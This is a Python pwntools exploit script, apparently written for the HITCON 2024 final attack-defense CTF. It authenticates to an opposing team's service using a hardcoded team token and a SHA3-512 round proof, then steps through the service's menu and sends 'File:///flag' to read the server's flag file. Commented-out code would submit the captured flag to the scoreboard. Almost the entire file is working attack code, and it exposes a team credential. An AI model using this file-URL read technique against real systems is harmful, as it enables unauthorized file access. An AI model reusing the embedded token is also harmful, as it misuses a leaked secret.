#!/usr/bin/env python3
from pwn import *
import sys
import hashlib
import json
import requests

context.log_level='debug'
def generate_sha3_512(round_value):
    # 固定 team_token 值
    team_token = "e00b7220af2d9f79c66c642bbcfc3640"
    # 將 team_token 和 round 串接
    input_data = f"{team_token}{round_value}"
    # 計算 SHA3-512
    sha3_512_hash = hashlib.sha3_512(input_data.encode()).hexdigest()
    return sha3_512_hash

# 使用者輸入 round 值
if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} [teamid]")
    exit(1)
teamid = sys.argv[1]
#r = remote(f"10.102.{teamid}.80", 5487)
r = remote(f"{teamid}80", 5487)

# 計算並顯示結果
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))


#round_value = sys.argv[2]
round_value = requests.get('https://final2024.hitconctf.com/overview').json()['round']['id']


# 計算並顯示結果
result = generate_sha3_512(round_value)

sla("> ","0")
r.recvuntil("round))\n")
r.sendline(result)

ru("token: ")
token = r.recvline()
print(f"token: {token}")
r.close()

#r = remote(f"10.102.{teamid}.80", 5487)
r = remote(f"{teamid}80", 5487)

r.recvuntil(">")
r.sendline("1")
r.send(token)
print(r.recvline())

r.recvuntil("> ")
r.sendline("0")

r.recvuntil("> ")
r.sendline("a")

r.recvuntil("> ")
r.sendline("0")

r.recvuntil("> ")
r.sendline("a")

r.recvuntil("> ")
r.recvuntil("id: ")
chanID = r.recvline()
r.recvuntil("> ")

r.sendline("2")
r.recvuntil("> ")

r.send(chanID)
r.recvuntil("> ")
r.sendline("4")
r.recvuntil("> ")

r.sendline("File:///flag")
r.recvuntil("token: ")
file1 = r.recvline()

r.sendline("6")
r.send(file1)

r.recvuntil("HITCON")
a = r.recvline()

flag = f"HITCON{a.decode()}"

print(flag, flush=True)
#import requests
#ooo = flag.replace('\n','')
#url = f"https://final2024.hitconctf.com/flag/?flags={ooo}&token=e00b7220af2d9f79c66c642bbcfc3640"
#headers = {
#    "accept": "application/json",
#}
#
#response = requests.post(url, headers=headers, data="")
#
#print(response.text)
